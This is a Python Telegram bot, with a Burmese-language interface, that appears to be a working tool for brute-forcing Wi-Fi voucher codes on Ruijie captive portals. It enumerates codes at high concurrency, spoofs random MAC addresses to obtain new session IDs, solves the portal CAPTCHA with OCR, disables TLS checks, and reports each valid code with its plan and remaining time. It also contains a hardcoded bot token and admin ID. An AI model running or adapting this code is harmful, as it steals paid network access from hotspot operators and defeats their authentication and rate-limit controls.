import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# Render မအိပ်သွားစေရန် Web Server ပြုလုပ်ခြင်း
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive!")

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# Background တွင် Web Server ကို သီးသန့် Run ခိုင်းထားမည်
threading.Thread(target=run_web_server, daemon=True).start()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================
#  Ruijie Voucher Scanner Bot (Standard Edition)
# ==============================================

import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, logging, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from datetime import datetime, timezone

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

BOT_TOKEN = '8645717367:AAEGO4Lj24HzOw3HT2wlV0wpFVU5ZoZiOz0'
ADMIN_ID = "579383132"

bot = AsyncTeleBot(BOT_TOKEN)
user_sessions = {}
session = None
_connector = None
_ocr = None
scan_tasks = {}
CONCURRENCY = 3000
_voucher_sem = None

RESULT_FILE = "result.json"

def load_results():
    if os.path.exists(RESULT_FILE):
        try:
            with open(RESULT_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_results_to_file(results):
    try:
        with open(RESULT_FILE, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"Error saving results: {e}")

async def handle(request):
    return web.Response(text="🌐 voucher code is start searching 💻")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None: return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode('.png', th)
        return ocr.classification(buf.tobytes()).upper()
    except: return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params={'sessionId': session_id, '_t': str(time.time())},
            headers=headers, timeout=aiohttp.ClientTimeout(total=4), ssl=False
        ) as r:
            if r.status == 200: return await r.read()
    except: pass
    return None

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json={'sessionId': session_id, 'authCode': text},
            timeout=aiohttp.ClientTimeout(total=4), ssl=False
        ) as r:
            if r.status == 200:
                d = await r.json()
                if d.get("success") is True: return session_id
    except: pass
    return None

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'}
    try:
        async with session.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=4), ssl=False) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: return session_id.group(1)
    except: pass
    return previous_session_id

def iter_codes(mode):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if length <= 7:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
        else:
            while True: yield "".join(random.choice(string.digits) for _ in range(8))
    elif mode.startswith("alpha_"):
        length = int(mode.split("_")[1])
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(length))
    elif mode.startswith("mixed_"):
        length = int(mode.split("_")[1])
        chars = string.ascii_lowercase + string.digits
        while True: yield "".join(random.choice(chars) for _ in range(length))
    elif mode == "random":
        while True: yield "".join(random.choice(string.digits) for _ in range(8))
    else: raise ValueError(f"မှားယွင်းသော Mode: {mode}")

async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]

    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=15)) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    if not res: res = data.get('data', {})
                    
                    plan = res.get('profileName') or res.get('planName') or 'Unknown'
                    
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return plan, time_str

                    total = res.get('totalMinutes') or res.get('totalTime')
                    if total is not None:
                        try:
                            hh, mm = divmod(int(total), 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                            return plan, time_str
                        except: pass
        except:
            continue

    return "Unknown", "Unknown"

async def perform_check(session_url, code, chat_id, scan_id=None):
    global _connector
    current_task = scan_tasks.get(chat_id)
    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
        return False, "stopped"

    post_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    timeout = aiohttp.ClientTimeout(total=5)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
        session_id = await get_session_id(task_session, session_url, None)
        if not session_id: return False, "retry"

        auth_code = None
        if _HAS_OCR:
            for _ in range(2):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    if not image: continue
                    text = await Captcha_Text(image)
                    if not text: continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except: pass
        if not auth_code and _HAS_OCR: return False, "retry"

        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code or ""}
        headers = {
            "content-type": "application/json", 
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        try:
            async with task_session.post(post_url, json=data, headers=headers, ssl=False) as req:
                response = await req.text()
        except: return False, "retry"

    if not response: return False, "retry"
    
    if 'logonUrl' in response or 'STA' in response:
        plan_name, plan_time = await Code_Expires_Date(session_id)

        hit_entry = f"💎 {code} | Plan: {plan_name} | Time: {plan_time}"
        results = load_results()
        cid = str(chat_id)
        if cid not in results: results[cid] = []
        if hit_entry not in results[cid]:
            results[cid].append(hit_entry)
            save_results_to_file(results)
        
        if chat_id in user_sessions:
            if "hit_codes" not in user_sessions[chat_id]: user_sessions[chat_id]["hit_codes"] = []
            user_sessions[chat_id]["hit_codes"].append(hit_entry)

        try:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🛑 ရပ်ရန်", callback_data="stop_scan"))
            await bot.send_message(
                chat_id, 
                f"⚔️ <b>ကုဒ်အမှန် တွေ့ရှိပါပြီ!</b>\n"
                f"💎 <b>ကုဒ်:</b> <code>{code}</code>\n"
                f"🃏 <b>Plan:</b> {plan_name}\n"
                f"⏰ <b>Time:</b> {plan_time}", 
                parse_mode="HTML", reply_markup=markup
            )
        except: pass
        return True, "found"
    elif any(x in response for x in ['limit', 'Limited']):
        return False, "limited"
    return False, "checked"

BATCH_SIZE = 1000

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None):
    global _voucher_sem
    _init_ocr()
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try: code_iter = iter_codes(mode)
    except Exception as e:
        await bot.send_message(chat_id, f"⚠️ အမှားအယွင်း: {e}")
        return

    checked, found_count, limited_count, retry_count = 0, 0, 0, 0
    scan_start = time.monotonic()
    if chat_id not in user_sessions: user_sessions[chat_id] = {}
    user_sessions[chat_id]["hit_codes"] = []

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"): break
            batch = []
            for _ in range(BATCH_SIZE):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break

            async def _check(c):
                async with _voucher_sem:
                    t = scan_tasks.get(chat_id)
                    if t and not t.get("stop"): return await perform_check(session_url, c, chat_id, scan_id)
                return False, "stopped"

            results_list = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            for res in results_list:
                if isinstance(res, tuple):
                    success, status = res
                    checked += 1
                    if success: found_count += 1
                    elif status == "limited": limited_count += 1
                    elif status == "retry": retry_count += 1

            elapsed = time.monotonic() - scan_start
            speed = int((checked / (elapsed / 60))) if elapsed > 0 else 0
            current_code = batch[-1] if batch else "---"
            hh, rem = divmod(int(elapsed), 3600)
            mm, ss = divmod(rem, 60)
            time_str = f"{hh:02d}:{mm:02d}:{ss:02d}"

            text = (
                f"🌐 <b>code start scanning</b> 💻\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"⚡ <b>speed:</b> {speed:,} c/m\n"
                f"✅ <b>found:</b> {found_count:,}\n"
                f"🧾 <b>Limited:</b> {limited_count:,}\n"
                f"⏲️ <b>time:</b> {time_str}\n"
                f"🎯 <b>scanning code:</b> <code>{current_code}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
            )
            hit_list = user_sessions[chat_id].get("hit_codes", [])
            if hit_list:
                text += "💻 <b>နောက်ဆုံးတွေ့ရှိထားသော ကုဒ်များ:</b>\n"
                text += "\n".join(hit_list[-3:])

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🛑 စကန်ရပ်ရန်", callback_data="stop_scan"))
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML", reply_markup=markup)
            except: pass
            await asyncio.sleep(0.5)

        summary = (
            f"🏁 <b>စကန်ဖတ်ခြင်း ပြီးဆုံးပါပြီ</b> 🏁\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🧾 <b>စုစုပေါင်း တွေ့ရှိမှု:</b> {found_count:,}\n"
            f"⏲️ <b>ကြာချိန်:</b> {time_str}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
        )
        hit_list = user_sessions[chat_id].get("hit_codes", [])
        if hit_list:
            summary += "\n📋 <b>တွေ့ရှိခဲ့သော ကုဒ်များစာရင်း:</b>\n"
            summary += "\n".join(hit_list)
            
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 start new .scan", callback_data="main_menu"), InlineKeyboardButton("📊 ရလဒ်များကြည့်ရန်", callback_data="cmd_result"))
        await bot.send_message(chat_id, summary, parse_mode="HTML", reply_markup=markup)
    except Exception as e: logging.error(f"Scan error: {e}")
    finally: scan_tasks.pop(chat_id, None)

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks: scan_tasks[chat_id]["stop"] = True
    if chat_id not in user_sessions: user_sessions[chat_id] = {"url": None, "mode": None, "state": None}
    else: user_sessions[chat_id]["state"] = None
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 URL ထည့်ရန်/ပြောင်းရန်", callback_data="update_url"),
        InlineKeyboardButton("🔢 ဂဏန်း ၆ လုံး", callback_data="select_mode_6"),
        InlineKeyboardButton("🔢 ဂဏန်း ၇ လုံး", callback_data="select_mode_7"),
        InlineKeyboardButton("🔢 ဂဏန်း ၈ လုံး", callback_data="select_mode_8"),
        InlineKeyboardButton("🔠 အက္ခရာ ၆ လုံး", callback_data="select_mode_alpha_6"),
        InlineKeyboardButton("🔠 အက္ခရာ ၇ လုံး", callback_data="select_mode_alpha_7"),
        InlineKeyboardButton("🔠 အက္ခရာ ၈ လုံး", callback_data="select_mode_alpha_8"),
        InlineKeyboardButton("🔀 Mixed ၆ လုံး", callback_data="select_mode_mixed_6"),
        InlineKeyboardButton("🔀 Mixed ၇ လုံး", callback_data="select_mode_mixed_7"),
        InlineKeyboardButton("🔀 Mixed ၈ လုံး", callback_data="select_mode_mixed_8"),
        InlineKeyboardButton("🎲 Random ၈ လုံး", callback_data="select_mode_random"),
        InlineKeyboardButton("📈 အခြေအနေ", callback_data="cmd_status"),
        InlineKeyboardButton("📊 ရလဒ်များ", callback_data="cmd_result"),
        InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data="cmd_stop")
    )
    text = (
        "🌐 <b> voucher code is start searching </b> 💻\n\n"
        "✨ <b>အသုံးပြုပုံ အဆင့်ဆင့်:</b>\n"
        "1️⃣ <b>URL ထည့်ရန်/ပြောင်းရန်</b> ကိုနှိပ်ပြီး Session URL ကို ပေးပို့ပါ။\n"
        "2️⃣ မိမိကြိုက်နှစ်သက်ရာ <b>Mode</b> တစ်ခုကို ရွေးချယ်ပါ။\n"
        "3️⃣ ပေါ်လာသော <b>Start Scan Now</b> ခလုတ်ကို နှိပ်ပြီး စတင်ပါ။"
    )
    await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)

@bot.message_handler(func=lambda message: user_sessions.get(message.chat.id, {}).get("state") == "awaiting_url")
async def handle_url_input(message):
    chat_id = message.chat.id
    url = message.text.strip()
    if url.startswith("http"):
        user_sessions[chat_id]["url"] = url
        user_sessions[chat_id]["state"] = None
        await bot.reply_to(message, "✅ <b>Session URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ!</b>", parse_mode="HTML")
        await cmd_start(message)
    else:
        await bot.reply_to(message, "⚠️ <b>URL မှားယွင်းနေပါသည်။</b> ကျေးဇူးပြု၍ http ဖြင့်စသော မှန်ကန်သော URL ကို ပေးပို့ပါ။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data
    await bot.answer_callback_query(call.id)

    if data == "main_menu":
        user_sessions[chat_id]["state"] = None
        await cmd_start(call.message)
    elif data == "update_url":
        if chat_id not in user_sessions: user_sessions[chat_id] = {}
        user_sessions[chat_id]["state"] = "awaiting_url"
        await bot.send_message(chat_id, "🔗 <b>ကျေးဇူးပြု၍ သင်၏ Session URL ကို ပေးပို့ပေးပါ:</b>", parse_mode="HTML")
    elif data.startswith("select_mode_"):
        mode = data.replace("select_mode_", "")
        user_sessions[chat_id]["mode"] = mode
        user_sessions[chat_id]["state"] = None
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀voucher code start scanning", callback_data="start_scan_now"))
        markup.add(InlineKeyboardButton("🔙 ပင်မမီနူးသို့", callback_data="main_menu"))
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"🎯 <b>ရွေးချယ်ထားသော Mode:</b> <code>{mode}</code>\n\nစကန်ဖတ်ခြင်း စတင်ရန် အောက်ပါခလုတ်ကို နှိပ်ပါ။",
            parse_mode="HTML", reply_markup=markup
        )
    elif data == "start_scan_now":
        if not user_sessions.get(chat_id, {}).get("url"):
            await bot.send_message(chat_id, "⚠️ <b>Session URL မရှိသေးပါ။</b> အရင်ဆုံး 'URL ထည့်ရန်/ပြောင်းရန်' ကို နှိပ်ပါ။", parse_mode="HTML")
            return
        mode = user_sessions[chat_id].get("mode")
        if not mode:
            await bot.send_message(chat_id, "⚠️ <b>Mode မရွေးရသေးပါ။</b>", parse_mode="HTML")
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.send_message(chat_id, "⚠️ စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ် လက်ရှိ လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
            return

        scan_id = str(uuid.uuid4())
        sent = await bot.send_message(chat_id, "🚀 <b>start scanning code</b>", parse_mode="HTML")
        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_sessions[chat_id]["url"], scan_id, progress_msg=sent))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    
    elif data == "stop_scan" or data == "cmd_stop":
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["stop"] = True
            scan_tasks[chat_id]["task"].cancel()
            scan_tasks.pop(chat_id, None)
        await bot.send_message(chat_id, "🛑 <b>စကန်ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
    elif data == "cmd_status":
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.send_message(chat_id, "⚡ <b>code scanning</b>", parse_mode="HTML")
        else:
            await bot.send_message(chat_id, "💻 You didn't start scanning", parse_mode="HTML")
    elif data == "cmd_result":
        results = load_results()
        codes = results.get(str(chat_id), [])
        if not codes: await bot.send_message(chat_id, "💻you don't have any success code", parse_mode="HTML")
        else:
            text = "🧾 <b>တွေ့ရှိထားသော ကုဒ်များ:</b>\n\n" + "\n".join(codes[-20:])
            await bot.send_message(chat_id, text, parse_mode="HTML")

async def main():
    global session, _connector
    print("code start scanning 🚀", flush=True)
    _connector = aiohttp.TCPConnector(limit=3000, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    try:
        await bot.infinity_polling(skip_pending=True)
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
